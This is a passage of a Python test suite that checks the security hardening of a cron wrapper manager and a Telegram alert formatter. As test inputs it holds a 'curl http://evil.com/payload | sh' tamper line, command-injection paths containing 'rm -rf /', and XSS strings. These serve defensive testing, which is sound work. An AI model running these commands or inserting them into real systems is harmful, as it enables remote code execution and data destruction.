        (getattr(errno, "EDQUOT", 122), "EDQUOT"),
        (errno.EROFS, "EROFS"),
        (errno.EACCES, "EACCES"),
    ],
)
def test_wrapper_temp_fatal_errno_siblings(tmp_path, caplog, err_code, err_name):
    """CWE-377 / DoS Defense: Fatal errno siblings must fail immediately on attempt 1 without retrying."""
    SelfHealingManager.reset_circuit_breaker()
    import logging
    scripts_dir = tmp_path / f"scripts_fatal_{err_name}"
    scripts_dir.mkdir(parents=True, exist_ok=True)
    mgr = SelfHealingManager(
        jobs_path=tmp_path / "jobs.json",
        repo_dir=tmp_path / "repo",
        scripts_dir=scripts_dir,
    )

    temp_attempts = []
    orig_open = os.open

    def fatal_temp_open(path, flags, *args, **kwargs):
        if isinstance(path, str) and path.startswith(".hermes_hourly_digest.sh.tmp."):
            temp_attempts.append(path)
            raise OSError(err_code, f"Injected fatal errno {err_name}")
        return orig_open(path, flags, *args, **kwargs)

    with caplog.at_level(logging.ERROR):
        with patch("os.open", side_effect=fatal_temp_open):
            with pytest.raises(OSError, match=f"Injected fatal errno {err_name}"):
                mgr.ensure_wrapper_script()

    # CRITICAL: exactly 1 attempt! No futile retries on fatal errno
    assert len(temp_attempts) == 1, f"Expected exactly 1 attempt on {err_name}, got {len(temp_attempts)}"

    # SIEM telemetry verified: emitted fatal errno record
    fatal_records = [
        json.loads(r.message)
        for r in caplog.records
        if "temp_create_fatal_errno" in r.message
    ]
    assert len(fatal_records) == 1
    assert fatal_records[0]["event"] == "temp_create_fatal_errno"
    assert fatal_records[0]["errno"] == err_code
    assert fatal_records[0]["attempt"] == 1


def test_wrapper_refuses_without_nofollow_delattr(tmp_path, monkeypatch):
    """CWE-59 Fail-Closed: System must refuse operation if os.O_NOFOLLOW is deleted via delattr."""
    SelfHealingManager.reset_circuit_breaker()
    scripts_dir = tmp_path / "scripts_delattr_nofollow"
    scripts_dir.mkdir(parents=True, exist_ok=True)
    mgr = SelfHealingManager(
        jobs_path=tmp_path / "jobs.json",
        repo_dir=tmp_path / "repo",
        scripts_dir=scripts_dir,
    )

    monkeypatch.delattr(os, "O_NOFOLLOW", raising=False)
    with pytest.raises(RuntimeError, match="O_NOFOLLOW unavailable on this platform"):
        mgr.ensure_wrapper_script()


def test_breaker_lock_not_held_across_io(tmp_path):
    """Concurrency Invariant: _circuit_lock must NOT be held during blocking filesystem I/O."""
    SelfHealingManager.reset_circuit_breaker()
    scripts_dir = tmp_path / "scripts_lock_io"
    scripts_dir.mkdir(parents=True, exist_ok=True)
    mgr = SelfHealingManager(
        jobs_path=tmp_path / "jobs.json",
        repo_dir=tmp_path / "repo",
        scripts_dir=scripts_dir,
    )

    lock_checks = []
    orig_write = os.write

    def non_blocking_write_spy(fd, data):
        # Verify circuit lock is NOT held during blocking os.write!
        can_acquire = SelfHealingManager._circuit_lock.acquire(blocking=False)
        if can_acquire:
            SelfHealingManager._circuit_lock.release()
            lock_checks.append(True)
        else:
            lock_checks.append(False)
        return orig_write(fd, data)

    with patch("os.write", side_effect=non_blocking_write_spy):
        wp, digest = mgr.ensure_wrapper_script()

    assert len(lock_checks) >= 2, "Expected os.write to be called for both wrapper and manifest"
    assert all(lock_checks), "Circuit lock was held during blocking os.write I/O!"


def test_recovery_rejects_tampered_wrapper_in_crash_window(tmp_path, caplog):
    """CWE-347 / CWE-494: Attacker tampering in crash window is detected and overwritten with authoritative bytes."""
    SelfHealingManager.reset_circuit_breaker()
    import logging
    scripts_dir = tmp_path / "scripts_tamper_crash_window"
    scripts_dir.mkdir(parents=True, exist_ok=True)
    mgr = SelfHealingManager(
        jobs_path=tmp_path / "jobs.json",
        repo_dir=tmp_path / "repo",
        scripts_dir=scripts_dir,
    )

    orig_replace = os.replace

    class SimulatedCrash(RuntimeError):
        pass

    # Inject crash right after wrapper replace succeeds, but before manifest replace
    def crash_after_wrapper_replace(src, dst, *args, **kwargs):
        res = orig_replace(src, dst, *args, **kwargs)
        if dst == "hermes_hourly_digest.sh":
            raise SimulatedCrash("Process killed / power outage between replaces")
        return res

    with patch("os.replace", side_effect=crash_after_wrapper_replace):
        with pytest.raises(SimulatedCrash):
            mgr.ensure_wrapper_script()

    wrapper_path = scripts_dir / "hermes_hourly_digest.sh"
    manifest_path = scripts_dir / ".hermes_hourly_digest.sh.manifest"
    assert wrapper_path.exists()
    assert not manifest_path.exists()

    # Attacker injects malicious payload into the manifest-less wrapper during crash window:
    wrapper_path.write_text("#!/bin/sh\ncurl http://evil.com/payload | sh\n", encoding="utf-8")

    # Reset circuit breaker to simulate a new cron process run
    SelfHealingManager.reset_circuit_breaker()

    # Recovery must REJECT adopting the attacker's bytes, log tamper event, and overwrite from authoritative render!
    with caplog.at_level(logging.WARNING):
        wp, digest = mgr.ensure_wrapper_script()

    # 1. Attacker's code must NOT be present!
    recovered_text = wrapper_path.read_text(encoding="utf-8")
    assert "evil.com" not in recovered_text, "CRITICAL: Attacker tampered bytes were adopted by self-heal!"
    assert "tools/hourly_digest_monitor.py" in recovered_text

    # 2. Manifest exists and sha256sum passes against authoritative bytes
    assert manifest_path.exists()
    res = subprocess.run(
        ["sha256sum", "-c", manifest_path.name],
        cwd=scripts_dir,
        capture_output=True,
        text=True,
    )
    assert res.returncode == 0

    # 3. SIEM tamper detection log was emitted
    tamper_events = [
        json.loads(r.message) for r in caplog.records
        if "wrapper_tamper_detected" in r.message
    ]
    assert len(tamper_events) >= 1
    assert tamper_events[0]["event"] == "wrapper_tamper_detected"


def test_circuit_breaker_persists_across_process_restart(tmp_path):
    """CWE-362 / Cron DoS Defense: Circuit breaker trips latched to persistent ledger across process restarts."""
    state_file = tmp_path / "test_circuit_state.json"
    SelfHealingManager.set_circuit_state_file(state_file)
    SelfHealingManager.reset_circuit_breaker()

    scripts_dir = tmp_path / "scripts_persist_breaker"
    scripts_dir.mkdir(parents=True, exist_ok=True)
    mgr = SelfHealingManager(
        jobs_path=tmp_path / "jobs.json",
        repo_dir=tmp_path / "repo",
        scripts_dir=scripts_dir,
    )

    orig_replace = os.replace

    # Inject fatal errno (ENOSPC) on replace of wrapper/manifest
    def failing_replace(src, dst, *args, **kwargs):
        dst_path = Path(dst)
        if dst_path.resolve().parent == state_file.resolve().parent and (
            dst_path.name.startswith(state_file.name) or dst_path.name.startswith(f".{state_file.name}")
        ):
            return orig_replace(src, dst, *args, **kwargs)
        raise OSError(errno.ENOSPC, "Persistent disk full error")

    with patch("os.replace", side_effect=failing_replace):
        for _ in range(SelfHealingManager.CIRCUIT_MAX_FAILURES):
            with pytest.raises(OSError, match="Persistent disk full error"):
                mgr.ensure_wrapper_script()

    # Verify persistent ledger file was created on disk
    assert state_file.exists(), "Persistent circuit state file was not created on disk!"
    with open(state_file, "r", encoding="utf-8") as fh:
        saved_state = json.load(fh)
    assert saved_state["errno"] == errno.ENOSPC
    assert saved_state["circuit_open_until"] > time.time()

    # Simulate a BRAND NEW process invocation (memory reset, fresh instance)
    with SelfHealingManager._circuit_lock:
        SelfHealingManager._wrapper_failures = 0
        SelfHealingManager._wrapper_circuit_open_until = 0.0
        SelfHealingManager._wrapper_circuit_open_until_mono = 0.0
        SelfHealingManager._wrapper_circuit_reason = None

    new_mgr = SelfHealingManager(
        jobs_path=tmp_path / "jobs.json",
        repo_dir=tmp_path / "repo",
        scripts_dir=scripts_dir,
    )

    # Must immediately refuse with circuit breaker OPEN from persistent ledger without touching disk
    with pytest.raises(RuntimeError, match="Wrapper reconciliation circuit breaker OPEN.*persistent failure"):
        new_mgr.ensure_wrapper_script()

    # Reset cleans up persistent ledger and restores execution
    SelfHealingManager.reset_circuit_breaker()
    assert not state_file.exists()
    wp, _ = new_mgr.ensure_wrapper_script()
    assert wp.exists()

    # Clean up static path override
    SelfHealingManager.set_circuit_state_file(None)


def test_token_source_is_csprng_default():
    """CWE-330: _token_source defaults to high-entropy cryptographic CSPRNG secrets.token_hex."""
    t1 = SelfHealingManager._token_source(16)
    t2 = SelfHealingManager._token_source(16)
    assert len(t1) == 32
    assert len(t2) == 32
    assert t1 != t2
    # Verify hex format
    assert re.fullmatch(r"[0-9a-f]{32}", t1) is not None
    assert re.fullmatch(r"[0-9a-f]{32}", t2) is not None


def test_poisoned_ledger_clamps_window_and_logs_siem_event(tmp_path, caplog):
    """CWE-20 / CWE-377: Attacker writing far-future timestamp (9e18) is clamped to _MAX_CIRCUIT_WINDOW_S and emits SIEM event."""
    import logging
    state_file = tmp_path / "poisoned_ledger.json"
    SelfHealingManager.set_circuit_state_file(state_file)
    SelfHealingManager.reset_circuit_breaker()

    # Poison the ledger with 9e18 (far future epoch timestamp)
    poisoned_state = {
        "tripped_at": time.time(),
        "circuit_open_until": 9e18,
        "failures": 3,
        "reason": "malicious far-future timestamp injection",
    }
    state_file.write_text(json.dumps(poisoned_state), encoding="utf-8")

    scripts_dir = tmp_path / "scripts_poison"
    scripts_dir.mkdir(parents=True, exist_ok=True)
    mgr = SelfHealingManager(
        jobs_path=tmp_path / "jobs.json",
        repo_dir=tmp_path / "repo",
        scripts_dir=scripts_dir,
    )

    with caplog.at_level(logging.WARNING):
        status = SelfHealingManager.get_circuit_status()

    # 1. Breaker is open
    assert status["is_open"] is True
    # 2. Window is clamped to <= _MAX_CIRCUIT_WINDOW_S (900.0s), NOT 9e18!
    assert status["cooldown_remaining"] <= SelfHealingManager._MAX_CIRCUIT_WINDOW_S
    assert status["cooldown_remaining"] > 0.0

    # 3. SIEM audit event 'circuit_ledger_window_clamped' was logged
    clamp_events = [
        json.loads(r.message) for r in caplog.records
        if "circuit_ledger_window_clamped" in r.message
    ]
    assert len(clamp_events) >= 1
    assert clamp_events[0]["event"] == "circuit_ledger_window_clamped"
    assert clamp_events[0]["raw_open_until"] == 9e18
    assert clamp_events[0]["max_window_s"] == SelfHealingManager._MAX_CIRCUIT_WINDOW_S

    # 4. ensure_wrapper_script raises with clamped cooldown, not 9e18
    with pytest.raises(RuntimeError) as exc_info:
        mgr.ensure_wrapper_script()
    assert "Wrapper reconciliation circuit breaker OPEN" in str(exc_info.value)
    match = re.search(r"cooling down for (\d+)s", str(exc_info.value))
    assert match is not None
    assert int(match.group(1)) <= int(SelfHealingManager._MAX_CIRCUIT_WINDOW_S)

    SelfHealingManager.reset_circuit_breaker()
    SelfHealingManager.set_circuit_state_file(None)


def test_corrupt_ledger_applies_conservative_hold_and_emits_siem_event(tmp_path, caplog):
    """CWE-20 / CWE-754: Corrupt/truncated JSON in persistent ledger triggers bounded conservative hold (30s) and emits SIEM event."""
    import logging
    state_file = tmp_path / "corrupt_ledger.json"
    SelfHealingManager.set_circuit_state_file(state_file)
    SelfHealingManager.reset_circuit_breaker()

    # Corrupt JSON syntax
    state_file.write_text("{invalid json garbage: missing quotes", encoding="utf-8")

    scripts_dir = tmp_path / "scripts_corrupt"
    scripts_dir.mkdir(parents=True, exist_ok=True)
    mgr = SelfHealingManager(
        jobs_path=tmp_path / "jobs.json",
        repo_dir=tmp_path / "repo",
        scripts_dir=scripts_dir,
    )

    with caplog.at_level(logging.WARNING):
        status = SelfHealingManager.get_circuit_status()

    # Breaker must apply conservative hold (is_open is True)
    assert status["is_open"] is True
    assert 0.0 < status["cooldown_remaining"] <= SelfHealingManager._CORRUPT_FAILSAFE_HOLD_S
    assert "corrupt_ledger_hold" in (status["reason"] or "")

    # Poison must be quarantined away from state_file
    assert not state_file.exists()
    assert any("corrupt" in p.name for p in tmp_path.iterdir())

    # SIEM audit event 'circuit_ledger_corrupt' was logged
    corrupt_events = [
        json.loads(r.message) for r in caplog.records
        if "circuit_ledger_corrupt" in r.message
    ]
    assert len(corrupt_events) >= 1
    assert corrupt_events[0]["event"] == "circuit_ledger_corrupt"
    assert corrupt_events[0]["hold_s"] == SelfHealingManager._CORRUPT_FAILSAFE_HOLD_S
    assert corrupt_events[0]["quarantined"] is True

    # ensure_wrapper_script raises RuntimeError during conservative hold
    with pytest.raises(RuntimeError, match="Wrapper reconciliation circuit breaker OPEN.*corrupt_ledger_hold"):
        mgr.ensure_wrapper_script()

    # Explicit reset_circuit_breaker clears ledger and unblocks self-healing
    SelfHealingManager.reset_circuit_breaker()
    assert not state_file.exists()
    status_after_reset = SelfHealingManager.get_circuit_status()
    assert status_after_reset["is_open"] is False
    assert status_after_reset["cooldown_remaining"] == 0.0

    wp, _ = mgr.ensure_wrapper_script()
    assert wp.exists()

    SelfHealingManager.reset_circuit_breaker()
    SelfHealingManager.set_circuit_state_file(None)


def test_type_confusion_ledger_applies_conservative_hold(tmp_path, caplog):
    """CWE-20 / CWE-754: Type confusion payloads (non-dict, strings, bools, NaN, Inf) apply bounded conservative hold."""
    state_file = tmp_path / "type_confused_ledger.json"
    SelfHealingManager.set_circuit_state_file(state_file)

    scripts_dir = tmp_path / "scripts_type_confusion"
    scripts_dir.mkdir(parents=True, exist_ok=True)
    mgr = SelfHealingManager(
        jobs_path=tmp_path / "jobs.json",
        repo_dir=tmp_path / "repo",
        scripts_dir=scripts_dir,
    )

    bad_payloads = [
        ["a", "list", "instead", "of", "dict"],
        {"circuit_open_until": "soon", "failures": 3},
        {"circuit_open_until": True, "failures": 3},
        {"circuit_open_until": None, "failures": 3},
        {"circuit_open_until": float("nan"), "failures": 3},
        {"circuit_open_until": float("inf"), "failures": 3},
        {"circuit_open_until": -float("inf"), "failures": 3},
    ]

    for payload in bad_payloads:
        state_file.write_text(json.dumps(payload), encoding="utf-8")
        status = SelfHealingManager.get_circuit_status()
        assert status["is_open"] is True, f"Failed conservative hold check for {payload}"
        assert 0.0 < status["cooldown_remaining"] <= SelfHealingManager._CORRUPT_FAILSAFE_HOLD_S
        assert "hold" in (status["reason"] or "")

    # Reset clears hold and allows self-healing to proceed
    SelfHealingManager.reset_circuit_breaker()
    assert not state_file.exists()
    status_after_reset = SelfHealingManager.get_circuit_status()
    assert status_after_reset["is_open"] is False

    wp, _ = mgr.ensure_wrapper_script()
    assert wp.exists()

    SelfHealingManager.reset_circuit_breaker()
    SelfHealingManager.set_circuit_state_file(None)


def test_persistent_corrupt_ledger_quarantines_and_recovers(tmp_path, caplog):
    """CWE-20/CWE-754: Repeated corrupt reads must not stack holds indefinitely; file is quarantined after first hold."""
    state_file = tmp_path / "corrupt.json"
    SelfHealingManager.set_circuit_state_file(state_file)
    SelfHealingManager.reset_circuit_breaker()
    state_file.write_text("{not json")

    s1 = SelfHealingManager.get_circuit_status()
    assert s1["is_open"] is True
    # Poison must be quarantined, not left to re-trigger rolling holds
    assert not state_file.exists()
    assert any("corrupt" in p.name for p in tmp_path.iterdir())

    # Fast forward past 30s hold (both wall clock and monotonic)
    # Once hold elapses, absent ledger must fail CLOSED, not re-hold!
    with patch("time.monotonic", return_value=time.monotonic() + 35.0):
        with patch("time.time", return_value=time.time() + 35.0):
            s2 = SelfHealingManager.get_circuit_status()
            assert s2["is_open"] is False
            assert s2["cooldown_remaining"] == 0.0

    SelfHealingManager.reset_circuit_breaker()
    SelfHealingManager.set_circuit_state_file(None)


def test_ledger_epoch_increments_monotonically(tmp_path):
    """Epoch Counter Contract: Ledger generation counter increments on trip, reset, and quarantine."""
    state_file = tmp_path / "epoch_test_ledger.json"
    SelfHealingManager.set_circuit_state_file(state_file)
    SelfHealingManager.reset_circuit_breaker()

    e0 = SelfHealingManager.get_circuit_status()["epoch"]

    # Trip breaker bumps epoch
    SelfHealingManager._trip_circuit_breaker("epoch_test_trip")
    e1 = SelfHealingManager.get_circuit_status()["epoch"]
    assert e1 > e0

    # Persisted ledger carries epoch
    with open(state_file, "r", encoding="utf-8") as fh:
        saved = json.load(fh)
    assert saved["epoch"] == e1

    # Reset bumps epoch
    SelfHealingManager.reset_circuit_breaker()
    e2 = SelfHealingManager.get_circuit_status()["epoch"]
    assert e2 > e1

    # Corrupt ledger quarantine bumps epoch
    state_file.write_text("corrupted_content")
    SelfHealingManager.get_circuit_status()
    e3 = SelfHealingManager.get_circuit_status()["epoch"]
    assert e3 > e2

    SelfHealingManager.reset_circuit_breaker()
    SelfHealingManager.set_circuit_state_file(None)


def test_monotonic_clock_anchoring_prevents_forward_wall_clock_bypass(tmp_path):
    """CWE-367 / CWE-1244: Forward wall-clock jumps cannot collapse in-process cooldown window."""
    SelfHealingManager.reset_circuit_breaker()
    state_file = tmp_path / "monotonic_test_ledger.json"
    SelfHealingManager.set_circuit_state_file(state_file)

    scripts_dir = tmp_path / "scripts_mono_test"
    scripts_dir.mkdir(parents=True, exist_ok=True)
    mgr = SelfHealingManager(
        jobs_path=tmp_path / "jobs.json",
        repo_dir=tmp_path / "repo",
        scripts_dir=scripts_dir,
    )

    # Trip breaker
    SelfHealingManager._trip_circuit_breaker("test_monotonic_trip")
    initial_status = SelfHealingManager.get_circuit_status()
    assert initial_status["is_open"] is True
    assert initial_status["cooldown_remaining"] > 0.0

    # Simulate an attacker or NTP sync jumping wall clock forward by 10,000 seconds
    wall_now = time.time()
    with patch("time.time", return_value=wall_now + 10000.0):
        # Monotonic time is NOT patched, so in-process monotonic cooldown is still active!
        status_after_clock_jump = SelfHealingManager.get_circuit_status()
        assert status_after_clock_jump["is_open"] is True, "Circuit collapsed despite monotonic anchor!"
        assert status_after_clock_jump["cooldown_remaining"] > 0.0

        with pytest.raises(RuntimeError, match="Wrapper reconciliation circuit breaker OPEN"):
            mgr.ensure_wrapper_script()

    SelfHealingManager.reset_circuit_breaker()
    SelfHealingManager.set_circuit_state_file(None)


def test_no_fcntl_logs_warning_and_uses_atomic_replace(tmp_path, caplog, monkeypatch):
    """CWE-362: When fcntl is None, single structured warning is logged, and ledger is published via atomic replace."""
    import logging
    state_file = tmp_path / "no_fcntl_ledger.json"
    SelfHealingManager.set_circuit_state_file(state_file)
    SelfHealingManager.reset_circuit_breaker()
    SelfHealingManager._warned_no_fcntl = False

    # Monkeypatch fcntl in module
    import tools.hourly_digest_monitor as hdm
    monkeypatch.setattr(hdm, "fcntl", None)

    with caplog.at_level(logging.WARNING):
        SelfHealingManager._trip_circuit_breaker("test_no_fcntl_trip")

    # Verify single structured warning 'flock_unavailable' was logged
    flock_warns = [
        json.loads(r.message) for r in caplog.records
        if "flock_unavailable" in r.message
    ]
    assert len(flock_warns) == 1
    assert flock_warns[0]["event"] == "flock_unavailable"

    # Trip again; verify _warned_no_fcntl prevents duplicate warning spam
    caplog.clear()
    with caplog.at_level(logging.WARNING):
        SelfHealingManager._trip_circuit_breaker("test_no_fcntl_second_trip")
    assert not any("flock_unavailable" in r.message for r in caplog.records)

    # Verify state file was written atomically and can be read
    assert state_file.exists()
    status = SelfHealingManager.get_circuit_status()
    assert status["is_open"] is True

    SelfHealingManager.reset_circuit_breaker()
    SelfHealingManager.set_circuit_state_file(None)


def test_reason_sanitization_strips_control_characters_and_bounds_length(tmp_path):
    """CWE-117: Persisted reason field is bounded to 256 chars and stripped of non-printable characters."""
    state_file = tmp_path / "sanitize_reason_ledger.json"
    SelfHealingManager.set_circuit_state_file(state_file)
    SelfHealingManager.reset_circuit_breaker()

    # Injected reason with ANSI escape code, control chars, newlines, and 500 characters
    malicious_reason = "\x1b[31;1mCRITICAL_INJECTION\x00\r\n\x08" + "B" * 500

    SelfHealingManager._trip_circuit_breaker(malicious_reason)

    assert state_file.exists()
    with open(state_file, "r", encoding="utf-8") as fh:
        saved_state = json.load(fh)

    clean_reason = saved_state["reason"]
    # 1. Bounded to at most 256 characters
    assert len(clean_reason) <= 256
    # 2. Only printable characters allowed
    assert all(ch.isprintable() for ch in clean_reason)
    assert "\x00" not in clean_reason
    assert "\r" not in clean_reason
    assert "\n" not in clean_reason
    assert "\x1b" not in clean_reason
    assert "CRITICAL_INJECTION" in clean_reason

    # 3. Reading status also preserves clean reason
    status = SelfHealingManager.get_circuit_status()
    assert status["reason"] == clean_reason

    SelfHealingManager.reset_circuit_breaker()
    SelfHealingManager.set_circuit_state_file(None)


def test_ledger_flock_cross_process_mutual_exclusion(tmp_path):
    """CWE-362: Advisory fcntl.flock on .circuit_breaker.lock serializes across processes."""
    if fcntl is None:
        pytest.skip("fcntl not available on platform")

    state_file = tmp_path / "flock_test_ledger.json"
    lock_file = tmp_path / "flock_test_ledger.json.lock"
    SelfHealingManager.set_circuit_state_file(state_file)
    SelfHealingManager.reset_circuit_breaker()

    # Enter lock via context manager
    with SelfHealingManager._with_ledger_lock():
        assert lock_file.exists(), "Lock file was not created by _with_ledger_lock"
        # In a separate file descriptor, an exclusive non-blocking lock must be rejected!
        other_fd = os.open(str(lock_file), os.O_RDWR)
        try:
            with pytest.raises((BlockingIOError, OSError)):
                fcntl.flock(other_fd, fcntl.LOCK_EX | fcntl.LOCK_NB)
        finally:
            os.close(other_fd)

    # After exiting the with block, lock must be released so other fd can acquire
    other_fd = os.open(str(lock_file), os.O_RDWR)
    try:
        fcntl.flock(other_fd, fcntl.LOCK_EX | fcntl.LOCK_NB)
        fcntl.flock(other_fd, fcntl.LOCK_UN)
    finally:
        os.close(other_fd)

    # Test re-entrant lock execution
    def inner_call():
        return "re_entered"

    res = SelfHealingManager._with_ledger_lock(inner_call)
    assert res == "re_entered"

    SelfHealingManager.reset_circuit_breaker()
    SelfHealingManager.set_circuit_state_file(None)


def test_security_artifacts_are_not_world_writable(tmp_path):
    """CWE-732 / Restrictive Modes Invariant: All security artifacts must satisfy mode & 0o022 == 0."""
    state_file = tmp_path / "mode_test_ledger.json"
    SelfHealingManager.set_circuit_state_file(state_file)
    SelfHealingManager.reset_circuit_breaker()

    scripts_dir = tmp_path / "scripts_mode_test"
    scripts_dir.mkdir(parents=True, exist_ok=True)
    mgr = SelfHealingManager(
        jobs_path=tmp_path / "jobs.json",
        repo_dir=tmp_path / "repo",
        scripts_dir=scripts_dir,
    )

    wp, digest = mgr.ensure_wrapper_script()
    manifest_path = scripts_dir / ".hermes_hourly_digest.sh.manifest"

    # Verify wrapper is 0o700 and manifest is 0o600
    assert (wp.stat().st_mode & 0o022) == 0
    assert (manifest_path.stat().st_mode & 0o022) == 0
    assert (scripts_dir.stat().st_mode & 0o022) == 0

    # Plant insecure permissions (e.g. 0o777 on wrapper, 0o666 on manifest)
    os.chmod(wp, 0o777)
    os.chmod(manifest_path, 0o666)
    assert (wp.stat().st_mode & 0o022) != 0
    assert (manifest_path.stat().st_mode & 0o022) != 0

    # ensure_wrapper_script must detect and harden both
    wp2, _ = mgr.ensure_wrapper_script()
    assert (wp2.stat().st_mode & 0o022) == 0
    assert (manifest_path.stat().st_mode & 0o022) == 0

    # Trip breaker and verify ledger and lock permissions
    SelfHealingManager._trip_circuit_breaker("test_mode_hardening")
    assert state_file.exists()
    assert (state_file.stat().st_mode & 0o022) == 0
    lock_file = tmp_path / "mode_test_ledger.json.lock"
    if lock_file.exists():
        assert (lock_file.stat().st_mode & 0o022) == 0

    SelfHealingManager.reset_circuit_breaker()
    SelfHealingManager.set_circuit_state_file(None)


def test_wrapper_render_shell_escaping_with_metacharacters(tmp_path):
    """CWE-78: Wrapper generation escapes malicious shell metacharacters in paths and passes bash syntax check."""
    malicious_repo = tmp_path / 'evil "$(rm -rf /)" ; `touch /tmp/pwn` && echo \'hacked\''
    malicious_python = '/usr/bin/python3; echo "injected"'
    mgr = SelfHealingManager(
        jobs_path=tmp_path / "jobs.json",
        repo_dir=malicious_repo,
        python_bin=malicious_python,
        scripts_dir=tmp_path / "scripts",
    )

    wrapper_content, digest = mgr.render_wrapper_content()

    # 1. Ensure quotes prevent evaluation
    assert f"REPO_DIR={shlex.quote(str(malicious_repo))}" in wrapper_content
    assert f"exec {shlex.quote(malicious_python)}" in wrapper_content

    # 2. Verify bash syntax check passes with code 0
    res = subprocess.run(
        ["bash", "-n"],
        input=wrapper_content,
        capture_output=True,
        text=True,
    )
    assert res.returncode == 0, f"Bash syntax check failed: {res.stderr}\nWrapper:\n{wrapper_content}"


def test_repeated_corruption_bounds_quarantine_artifacts(tmp_path, caplog):
    """CWE-400: Ring buffer eviction caps total quarantine artifacts to _MAX_QUARANTINE_ARTIFACTS to prevent inode exhaustion."""
    import logging
    state_file = tmp_path / "repeated_corrupt.json"
    SelfHealingManager.set_circuit_state_file(state_file)
    SelfHealingManager.reset_circuit_breaker()

    max_artifacts = SelfHealingManager._MAX_QUARANTINE_ARTIFACTS  # 5
    num_corruptions = max_artifacts + 5  # 10 distinct payloads

    with caplog.at_level(logging.INFO):
        for i in range(num_corruptions):
            # Write unique poison bytes so each has a unique sha256
            state_file.write_text(f"unique_poison_payload_{i}_{time.time()}", encoding="utf-8")
            SelfHealingManager.get_circuit_status()

    # Verify that total quarantine artifacts on disk <= _MAX_QUARANTINE_ARTIFACTS
    prefix = f".{state_file.name}.corrupt."
    quarantine_files = [p for p in tmp_path.iterdir() if p.name.startswith(prefix)]
    assert len(quarantine_files) <= max_artifacts
    assert len(quarantine_files) == max_artifacts

    # Verify that SIEM 'quarantine_evicted' was logged
    evicted_events = [
        json.loads(r.message) for r in caplog.records
        if "quarantine_evicted" in r.message
    ]
    assert len(evicted_events) >= 5
    assert evicted_events[0]["event"] == "quarantine_evicted"
    assert evicted_events[0]["max_artifacts"] == max_artifacts

    SelfHealingManager.reset_circuit_breaker()
    SelfHealingManager.set_circuit_state_file(None)


def test_identical_corrupt_content_deduplicates_quarantine_artifacts(tmp_path, caplog):
    """CWE-400 / Content-Addressing: Repeated identical poison bytes collapse to a single deduplicated artifact."""
    import logging
    state_file = tmp_path / "dedup_corrupt.json"
    SelfHealingManager.set_circuit_state_file(state_file)
    SelfHealingManager.reset_circuit_breaker()

    identical_poison = "{not valid json payload identical"

    with caplog.at_level(logging.WARNING):
        for _ in range(5):
            state_file.write_text(identical_poison, encoding="utf-8")
            SelfHealingManager.get_circuit_status()

    # Exactly 1 quarantine file created with that sha256 digest
    prefix = f".{state_file.name}.corrupt."
    quarantine_files = [p for p in tmp_path.iterdir() if p.name.startswith(prefix)]
    assert len(quarantine_files) == 1

    digest = hashlib.sha256(identical_poison.encode("utf-8")).hexdigest()[:32]
    expected_name = f".{state_file.name}.corrupt.{digest}"
    assert quarantine_files[0].name == expected_name

    # Check SIEM logs for deduplicated events
    corrupt_events = [
        json.loads(r.message) for r in caplog.records
        if "circuit_ledger_corrupt" in r.message
    ]
    assert len(corrupt_events) == 5
    # First is not deduplicated, remaining 4 are deduplicated
    assert corrupt_events[0]["deduplicated"] is False
    assert corrupt_events[0]["quarantined"] is True
    for ev in corrupt_events[1:]:
        assert ev["deduplicated"] is True
        assert ev["quarantined"] is True

    SelfHealingManager.reset_circuit_breaker()
    SelfHealingManager.set_circuit_state_file(None)


def test_epoch_monotonicity_persists_across_process_restart(tmp_path):
    """Epoch Monotonicity Across Restarts: In-memory resets or process restart reload epoch from .epoch marker file."""
    state_file = tmp_path / "restart_epoch_ledger.json"
    epoch_file = tmp_path / f".{state_file.name}.epoch"
    SelfHealingManager.set_circuit_state_file(state_file)
    SelfHealingManager.reset_circuit_breaker()

    # Trip breaker
    SelfHealingManager._trip_circuit_breaker("restart_test_trip_1")
    e1 = SelfHealingManager.get_circuit_status()["epoch"]
    assert epoch_file.exists()
    assert int(epoch_file.read_text(encoding="utf-8").strip()) == e1

    # Simulate process restart: wipe in-memory variables
    SelfHealingManager._ledger_epoch = 0
    SelfHealingManager._wrapper_circuit_open_until = 0.0
    SelfHealingManager._wrapper_circuit_open_until_mono = 0.0
    SelfHealingManager._wrapper_circuit_reason = None
    SelfHealingManager._circuit_state_file = None

    # Re-initialize with same state_file -> should load epoch from marker
    SelfHealingManager.set_circuit_state_file(state_file)
    status_reloaded = SelfHealingManager.get_circuit_status()
    assert status_reloaded["epoch"] >= e1

    # Next trip must increment beyond e1, not restart at 1
    SelfHealingManager._trip_circuit_breaker("restart_test_trip_2")
    e2 = SelfHealingManager.get_circuit_status()["epoch"]
    assert e2 > e1
    assert int(epoch_file.read_text(encoding="utf-8").strip()) == e2

    SelfHealingManager.reset_circuit_breaker()
    SelfHealingManager.set_circuit_state_file(None)


def test_html_entity_escaping_prevents_telegram_parse_errors(tmp_path):
    """CWE-116: User-controlled and error strings in Telegram alerts are escaped with html.escape."""
    env_file = tmp_path / ".env"
    env_file.write_text("TELEGRAM_BOT_TOKEN=test-token-123\n")
    notifier = HermesTelegramNotifier(env_file=env_file, target_chat_id=TEST_CHAT_ID)

    # Injected strings with HTML tags, ampersands, quotes, and brackets
    malicious_scan = {
        "overall_health_score": 30,
        "severity": "CRITICAL",
        "cron": {
            "cron_health_score": 10,
            "clogged_jobs": [
                {
                    "job_name": "job<script>alert(1)</script>&foo",
                    "consecutive_failures": 5,
                    "last_error": "SyntaxError: <unknown> & unescaped 'quotes' \"here\"",
                }
            ],
            "drift_skipped_jobs": [
                {
                    "job_name": "drift<style>body{display:none}</style>&bar",
                    "model_snapshot": "snapshot&v=1<test>",
                }
            ],
            "auth_failed_jobs": [
                {
                    "job_name": "auth&job<img src=x onerror=alert(2)>",
                    "last_error": "Token expired & invalid_grant <details>",
                }
            ],
            "ticker_heartbeat": {"is_stale": True, "age_seconds": 150.0},
        },
        "entropy": {
            "entropy_health_score": 20,
            "streams": [
                {
                    "name": "Stock News & Feeds <inject>",
                    "status": "CRITICAL",
                    "hours_since_crawl": 99.0,
                    "articles_24h": 0,
                    "unique_symbols": 0,
                }
            ],
        },
    }

    alert_html = notifier.format_urgent_alert(malicious_scan)
    # Raw unescaped dangerous tags must NOT be present
    assert "<script>" not in alert_html
    assert "</script>" not in alert_html
    assert "<style>" not in alert_html
    assert "<img" not in alert_html
    assert "<inject>" not in alert_html
    # Escaped tags must be present
    assert "&lt;script&gt;" in alert_html
    assert "&amp;foo" in alert_html
    assert "&amp; invalid_grant" in alert_html

    digest_html = notifier.format_hourly_digest(malicious_scan)
    assert "<inject>" not in digest_html
    assert "&lt;inject&gt;" in digest_html


